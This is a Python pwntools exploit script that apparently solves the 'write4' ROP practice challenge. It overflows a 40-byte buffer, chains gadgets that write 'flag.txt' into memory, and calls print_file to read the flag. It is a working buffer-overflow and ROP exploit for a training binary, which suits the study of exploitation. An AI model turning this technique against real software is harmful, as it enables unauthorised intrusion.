#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template write4
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'write4')
context.terminal = ["alacritty", "-e", "zsh", "-c"]
# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR

lib = ELF("./libwrite4.so")

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Partial RELRO
# Stack:      No canary found
# NX:         NX enabled
# PIE:        No PIE (0x400000)
# RUNPATH:    b'.'
# Stripped:   No

io = start()

"""
0x0000000000400690 : pop r14 ; pop r15 ; ret
0x0000000000400628 : mov qword ptr [r14], r15 ; ret
"""

payload = b"A" * 40
payload += p64(0x0000000000400690) # pop r14 ; pop r15 ; ret
payload += p64(0x601500)           # writeble addr
payload += b"flag.txt"
payload += p64(0x0000000000400628) # mov qword ptr [r14], r15 ; ret
payload += p64(0x0000000000400693) # pop rdi ; ret
payload += p64(0x601500)           
payload += p64(exe.sym["print_file"])

io.sendlineafter(b"> ", payload)

io.interactive()

